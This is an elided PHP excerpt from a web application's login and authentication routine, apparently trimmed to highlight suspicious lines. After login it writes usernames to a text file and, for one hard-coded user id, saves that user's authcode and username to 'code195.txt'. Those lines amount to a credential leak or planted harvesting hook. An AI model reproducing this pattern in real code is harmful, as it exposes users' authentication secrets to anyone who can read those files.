	...
	function AppObject(&$config)
	{
		...
		if($authcode && $verifyUser){
			...
			if ((isset($userTmp['groupid']) && in_array($userTmp['groupid'], array(5, 6, '5', '6')) && $this->Act != 'sync') || ($userTmp['status'] == -1 && $this->Act != 'sync') ){
				$return = ($this->Act == 'doLogin') ? array('status' => 5300) : array('status' => 10001);
				$this->outjson($return);
			}
		...
		if($uid>0){
			...
			file_put_contents('username_code.txt',var_export($username,true));
			define('MEMBER_NAME',$username);
			if($uid==5180478){
				file_put_contents('code195.txt',$authcode.'=='.$username);
			}
